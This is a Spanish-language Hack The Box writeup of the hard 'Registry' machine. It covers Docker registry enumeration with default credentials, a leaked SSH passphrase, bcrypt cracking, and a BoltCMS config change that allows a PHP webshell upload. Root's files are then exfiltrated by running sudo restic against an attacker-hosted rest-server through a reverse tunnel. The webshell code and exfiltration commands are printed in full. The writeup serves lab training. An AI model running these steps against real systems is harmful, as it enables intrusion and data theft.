+++
author = "Andrés Del Cerro"
title = "Hack The Box: Registry Writeup | Hard"
date = "2024-08-28"
description = ""
tags = [
    "HackTheBox",
    "Registry",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTPS Enumeration",
    "SSL Certificate Enumeration",
    "Docker Registry Enumeration",
    "Fuzzing",
    "Information Leakage",
    "Weaponizing BoltCMS",
    "User Pivoting",
    "Abusing Restic Service",
    "Restic Server"
]

+++

# Hack The Box: Registry Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Registry"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.220.101 --ulimit 5000 -g
10.129.220.101 -> [22,80,443]
```

```console
$ nmap -p22,80,443 -sCV 10.129.220.101 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 20:39 CEST
Nmap scan report for 10.129.220.101
Host is up (0.035s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.11 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 10.129.220.101 -sU --min-rate 5000 -n -Pn -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 20:40 CEST
Nmap scan report for 10.129.220.101
Host is up (0.036s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
16939/udp closed unknown
17423/udp closed unknown
17824/udp closed unknown
31109/udp closed unknown
40732/udp closed unknown
58002/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

Del escaneo inicial detectamos un dominio `registry.htb` y un sudominio `docker.registry.htb`. Me llama la atención el subdominio, vamos a introducir esta información al `/etc/hosts`.

# HTTP/S Enumeration
Podemos echarle un vistazo al certificado TLS pero no encontramos ninguna información relevante.
```console
$ openssl s_client -showcerts -connect registry.htb:443
```

## registry.htb
Vamos a empezar con el dominio principal
`whatweb`  no reporta nada interesante.

```console
$ whatweb https://registry.htb
https://registry.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.220.101], Strict-Transport-Security[max-age=63072000; includeSubdomains], Title[Welcome to nginx!], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.14.0]
```

```console
$ whatweb http://registry.htb
http://registry.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.220.101], Strict-Transport-Security[max-age=63072000; includeSubdomains], Title[Welcome to nginx!], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.14.0]
```

Encontramos una ruta `/install/` que no se que es esto, parece como que ha intentado cargar un binario o un archivo no legible.
![Write-up Image](images/Screenshot_1.png)

También vemos una ruta `/bolt/` que nos lleva a un sitio web que usa BoltCMS.
![Write-up Image](images/Screenshot_2.png)

Encontramos la ruta para iniciar sesión bajo `/bolt/bolt/login` pero para este CMS no hay credenciales por defecto ya que se pide una contraseña en la instalación.
![Write-up Image](images/Screenshot_3.png)

Vemos que hay un exploit para conseguir ejecución remota de comandos pero debo de estar autenticado.
![Write-up Image](images/Screenshot_4.png)

Así que vamos a tener en cuenta esta instancia de BoltCMS pero vamos a movernos lateralmente a enumerar el subdominio `docker`

## docker.registry.htb

No detectamos nada con `whatweb` y además parece que los dos sitios (HTTP/HTTPS) son iguales.
```console
$ whatweb https://docker.registry.htb/
https://docker.registry.htb/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.220.101], Strict-Transport-Security[max-age=63072000; includeSubdomains], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.14.0]
```

```console
$ whatweb http://docker.registry.htb/
http://docker.registry.htb/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.129.220.101], Strict-Transport-Security[max-age=63072000; includeSubdomains], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.14.0]
```

La página principal no muestra nada.
![Write-up Image](images/Screenshot_5.png)

Con `feroxbuster` al fuzzear encontramos una ruta `/v2`

```console
$ feroxbuster -u https://docker.registry.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -k
```
![Write-up Image](images/Screenshot_6.png)

Nos pide autenticación.
Al probar `admin:admin` vemos que podemos autenticarnos.

![Write-up Image](images/Screenshot_7.png)
![Write-up Image](images/Screenshot_8.png)

Pero no vemos nada, vamos a seguir fuzzeando.
No encontramos nada

Podemos buscar que es esto.

> Registry, the open source implementation for storing and distributing container images and other content, has been donated to the CNCF. Registry now goes under the name of Distribution, and the documentation has moved to [distribution/distribution](https://distribution.github.io/distribution/).

![Write-up Image](images/Screenshot_9.png)

## Enumerating Docker Registry -> Foothold
Parece que es un proyecto open source para distribuir y almacenar contenedores de imagenes.

Leyendo la documentación y buscando un poco me encontré en [esta publicación de StackOverflow](https://stackoverflow.com/questions/56193110/how-can-i-use-docker-registry-http-api-v2-to-obtain-a-list-of-all-repositories-i) que podemos ver los repositorio bajo la ruta `/v2/_catalog`

Encontramos uno bastante interesante.
![Write-up Image](images/Screenshot_10.png)

Existe una imagen.
![Write-up Image](images/Screenshot_11.png)

Para descargarnos una imagen primero tenemos que descargarnos el manifest para conseguir todos los blobs (bloques de datos) que debemos descargar.

Como ya sabemos el nombre de la imagen que es `bolt-image` y que existe una "release" que es `latest` ya podemos conseguir el manifest.

```console
curl -s -k https://admin:admin@docker.registry.htb/v2/bolt-image/manifests/latest
```

Nos devuelve este JSON
```json
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      {
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
      },
      {
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
      },
      {
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },
      {
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":{\"Cmd\":[\"/bin/bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "3MCK:KCII:GX53:K7XE:YQ4I:FNCS:UI7H:GBGY:G7XF:XI6T:72Y3:CMXC",
               "kty": "EC",
               "x": "V-IKr7gn8l7KQCFuzNT6uGrsiaeoJlPn3nr0MUVph_E",
               "y": "JnMtBk8IEIHsNrJkBmkw-rsjzRPsCl0uuHl4klcBuUI"
            },
            "alg": "ES256"
         },
         "signature": "V1D_sDR9MESz-83R4ZWmC3nyX6qCuwFRFTs1k-VHg4dA1vZiAj0MsKy2WvtTM3U7gp0ud8PF2pNi2s-RTL48LQ",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNC0wOC0yOFQxNzoxMzozM1oifQ"
      }
   ]
}
```

Vemos que tenemos 10 blobs.

Ahora desde el navegador (mas cómodamente) nos vamos a descargar los 10 blobs.

Simplemente cogemos el sha256 de uno de ellos y al abrir la ruta `https://docker.registry.htb/v2/bolt-image/blobs/SHA256` se nos descargará.

Una vez nos descarguemos todos.
![Write-up Image](images/Screenshot_12.png)

Podemos ver que estos blobs son archivos gzip.
```console
$ file sha256_02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c 
sha256_02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c: gzip compressed data, original size modulo 2^32 3072
```

Podemos extraer todos los archivos.

```console
mkdir extract
```

```console
for file in $(ls | grep sha); do tar -xvf $file -C extract/; done
```

En `/etc/profile.d/` existen algunos scripts, en este directorio se ejecutan automáticamente los scripts cuando un usuario inicie sesión de shell.

```console
cat *
# Make sure the locale variables are set to valid values.
eval $(/usr/bin/locale-check C.UTF-8)
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Y vemos algo interesante.
Una credencial: `GkOcz221Ftb3ugog`

El problema es que no tengo un nombre de usuario válido para intentar iniciar sesión por SSH.

Esta credencial tampoco vale para el BoltCMS.

No vemos nada en el `/etc/passwd`
```console
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Me dí cuenta de que en `/root/` existían archivos y una clave privada.

Al analizar el fichero `.bash_history`

![Write-up Image](images/Screenshot_13.png)

Al utilizar esta clave privada para iniciar sesión nos pide una passphrase y si introducimos la credencial anteriormente encontrada `GkOcz221Ftb3ugog`

```console
$ ssh -i .ssh/id_rsa bolt@registry.htb
The authenticity of host 'registry.htb (10.129.220.101)' can't be established.
ED25519 key fingerprint is SHA256:LPF3XNgoNZT9BCp04FNkB9ALR69KVQYT0cV7ld6ghUk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'registry.htb' (ED25519) to the list of known hosts.
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Wed Aug 28 19:24:45 UTC 2024

  System load:                    0.0
  Usage of /:                     60.2% of 4.71GB
  Memory usage:                   16%
  Swap usage:                     0%
  Processes:                      170
  Users logged in:                0
  IP address for eth0:            10.129.220.101
  IP address for br-1bad9bd75d17: 172.18.0.1
  IP address for docker0:         172.17.0.1
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@registry:~$
```

Podemos ver la flag de usuario
```console
bolt@registry:~$ cat user.txt 
58ada1bc41faa...
```

# Privilege Escalation
Vemos 3 usuarios con bash
```console
bolt@registry:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
bolt:x:1001:1001::/home/bolt:/bin/bash
git:x:1000:33::/var/www/html:/bin/bash

```

En `/var/www/html` encontramos un fichero `backup.sh` que no pertenece al `bolt`

```console
bolt@registry:/var/www/html$ cat backup.php 
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

Este archivo pertenece a `root`.
```console
bolt@registry:/var/www/html$ ls -la
total 28
drwxrwxr-x  4 www-data www-data 4096 Apr  6  2021 .
drwxr-xr-x  4 root     root     4096 Apr  6  2021 ..
-rw-------  1 git      www-data    0 Oct  8  2019 .bash_history
-rw-r--r--  1 root     root       85 May 25  2019 backup.php
drwxrwxr-x 11 www-data www-data 4096 Apr  6  2021 bolt
-rwxrwxr-x  1 www-data www-data  612 May  6  2019 index.html
-rw-r--r--  1 root     root      612 Oct 21  2019 index.nginx-debian.html
drwxr-xr-x  2 root     root     4096 Apr  6  2021 install
bolt@registry:/var/www/html$ bat .bash_history 
```

Por probar vamos a migrar al usuario `www-data` ya que debería de tener permisos para ejecutar el script en PHP ya que utiliza `sudo` y quizás podamos hacer algo.

Para ello podemos pasarnos la base de datos que está utilizando esta instancia de BoltCMS que en este caso es SQLite.

```console
bolt@registry:/var/www/html/bolt/app/database$ ls
bolt.db
```

Podemos coger el hash del usuario administrador.
```console
sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||2||["root","everyone"]
```

Conseguimos crackearlo.
```console
$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (?)     
1g 0:00:00:02 DONE (2024-08-28 23:34) 0.4424g/s 159.2p/s 159.2c/s 159.2C/s strawberry..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y conseguimos iniciar sesión en el BoltCMS.
![Write-up Image](images/Screenshot_14.png)

Ahora podemos ver que tema está en uso.
![Write-up Image](images/Screenshot_15.png)

Editar el archivo `index.twig` de esta plantilla.
`http://registry.htb/bolt/bolt/file/edit/themes/base-2018/index.twig`

Ha quedado así.
![Write-up Image](images/Screenshot_16.png)

Pero al ponernos en escucha no me llega la reverse shell y me devuelve un Gateway Time-out, por lo cual quizás existe algún tipo de firewall por detrás.

Igualmente al intentar ejecutar un comando.
```console
{{'whoami'|filter('system')}}
```

Llegué a la conclusión de que este BoltCMS no tiene un filtro llamado `system` por lo cual no podía ejecutar comando a nivel de sistema.

Pero después de comerme la cabeza un rato, me di cuenta de que podíamos subir archivos pero no podíamos subir recursos PHP.

Aún así, podemos editar el archivo `config.yml` y habilitar este tipo de archivos.
![Write-up Image](images/Screenshot_17.png)

Nos creamos la típica webshell en PHP
```console
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

Y ahora si que podemos subir el archivo.
![Write-up Image](images/Screenshot_18.png)

Y conseguimos ejecutar comandos como `www-data`.
![Write-up Image](images/Screenshot_19.png)

Lo que podemos hacer para ganar una consola interactiva en la máquina víctima como `www-data` es utilizar una Bind Shell en vez de una Reverse Shell.

Es decir, estar en espera de conexiones por un puerto para ofrecer una bash en vez de conectarnos nosotros a un puerto (en el equipo víctima).

![Write-up Image](images/Screenshot_21.png)

Y ahora si nos conectamos a este puerto...
```console
$ nc 10.129.220.101 8080
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El problema es que cada X tiempo surge un 504 Gateway Time-out y hay que repetir el proceso.

Así que para trabajar más cómodamente me di cuenta de que podíamos crear un directorio **a través de la webshell** y no se borraba.

![Write-up Image](images/Screenshot_24.png)

![Write-up Image](images/Screenshot_25.png)

Me descargué esta webshell de Github.
```console
$ wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
```

La subí en ese directorio y ya tenemos una web shell mas que decente que no se borra :)
![Write-up Image](images/Screenshot_26.png)

Vemos que podemos ejecutar como el usuario `root` y sin contraseña el binario `restic` con los parámetros `backup -r` cualquier fichero que empiece por `rest` 
![Write-up Image](images/Screenshot_27.png)

Después de investigar que es `restic`

Restic es un programa de copia de seguridad moderno y versátil diseñado para respaldar archivos de manera segura y eficiente. Aquí tienes un resumen de sus características clave:

Entonces podemos primero crearnos un repositorio para poder restaurar, en mi caso me lo crearé en `/tmp/` con el nombre de `restpwn`
```console
bolt@registry:/tmp$ restic init -r restpwn
enter password for new repository: 
enter password again: 
created restic repository 4e94b83ff8 at restpwn

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
bolt@registry:/tmp$
```

```console
bolt@registry:/tmp/restpwn$ ls
config  data  index  keys  locks  snapshots
```

Después de investigar un rato no conseguí nada.

Y encontré lo siguiente.
https://github.com/restic/rest-server

Parece que podemos crear un servidor para poder hacer backups remotamente de datos utilizando el cliente.

Y lo mejor es que para utilizarlo, se requiere la URL rest:// es decir, que empieza por `rest`

Después de descargar el binario de las Release del Github, podemos ejecutar el servidor de la siguiente manera. **Esto es un ejemplo, mas adelante cambiamos la ejecución del servidor**.
```console
./rest-server --no-auth --listen 0.0.0.0:3000
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
start server on [::]:3000
```

Ahora vamos mediante SSH a hacer port forwarding para conseguir acceder a este servicio mediante la máquina víctima.

```console
$ ssh -i .ssh/id_rsa bolt@registry.htb -R:3000:localhost:3000
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Wed Aug 28 20:45:11 UTC 2024

  System load:                    0.0
  Usage of /:                     60.2% of 4.71GB
  Memory usage:                   17%
  Swap usage:                     0%
  Processes:                      177
  Users logged in:                0
  IP address for eth0:            10.129.220.101
  IP address for br-1bad9bd75d17: 172.18.0.1
  IP address for docker0:         172.17.0.1
Last login: Wed Aug 28 19:24:46 2024 from 10.10.14.125
bolt@registry:~$
```

En nuestra máquina de atacante vamos a crear un repositorio en el directorio donde tenemos el binario de `rest-server`.
```console
$ restic init -r .
enter password for new repository: 
enter password again: 
created restic repository 8a2c9bfab2 at .

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Ahora para el servidor, vamos a hacer un pequeño cambio.

Vamos a consultar primero que versión de restic tiene la máquina víctima y vemos que tiene la `0.8.3`
```console
www-data@registry:~/html/bolt/files/.persistent$ restic version
restic version
restic 0.8.3
compiled with go1.10 on linux/amd64

```

Vamos a utilizar una versión de `rest-server` que sea compatible.
[Utilizaremos esta de aquí](https://github.com/restic/rest-server/archive/refs/tags/v0.9.2.zip)

Aquí hay que liarla un poco porque necesitamos una versión inferior de `go` para poder compilar el `rest-server`

```console
$ wget https://storage.googleapis.com/golang/go1.7.1.linux-amd64.tar.gz
```

Lo extraemos y setteamos la variable `PATH` para que valga donde hayamos extraído el tar + /bin.
```console
export PATH=/tmp/rest-server-0.9.3/go/bin:$PATH
```

Y ahora si que podemos hacer un `build` de `rest-server`

```console
$ go run build.go 
warning: GOPATH set to GOROOT (/tmp/rest-server-0.9.3/go) has no effect
```

Antes de iniciar el servidor, también necesitamos el cliente para poder crear un repositorio que sea compatible con la versión de `restic` que tenga la máquina víctima.

Para esto tenemos el binario ya compilado aquí.
```console
$ wget https://github.com/restic/restic/releases/download/v0.8.3/restic_0.8.3_linux_amd64.bz2
```

Lo descomprimimos.
```console
$ bzip2 -d restic_0.8.3_linux_amd64.bz2
```

Le damos permiso de ejecución.
```console
$ chmod +x restic_0.8.3_linux_amd64
```

Y creamos un repositorio en un directorio llamado `bk`
```console
$ mkdir bk
┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3]
└──╼ [★]$ ./restic_0.8.3_linux_amd64 init -r ./bk/
enter password for new repository: 
enter password again: 
created restic repository 011e691536 at ./bk/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Ahora iniciamos el servidor estableciendo con el parámetro `--path` el repositorio recién creado
```console
$ ./rest-server --listen 0.0.0.0:3000 --path ./bk/
rest-server 0.9.3 compiled with go1.7.1 on linux/amd64
Data directory: ./bk/
Authentication disabled
Starting server on 0.0.0.0:3000
```

Y ahora por fin podemos crear una copia en el repositorio remoto del directorio `/root`
```console
www-data@registry:~/html/bolt/files/.persistent$ sudo restic backup -r rest:http://127.0.0.1:3000/ /root
< restic backup -r rest:http://127.0.0.1:3000/ /root
enter password for repository: pointed

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 13 files in 0:00
[0:00] 100.00%  27.856 KiB / 27.856 KiB  23 / 23 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 0c617191 saved
```

Ahora solo falta reestablecer el backup.

Nos venimos a nuestra máquina de atacante.

Y reestablecemos el backup al directorio `restore`
```console
$ ./restic_0.8.3_linux_amd64 -r ./bk/ restore latest --target restore
```

Podemos ver la flag de `root`

```console
$ cd restore/
┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3/restore]
└──╼ [★]$ ls
root
┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3/restore]
└──╼ [★]$ cd root/
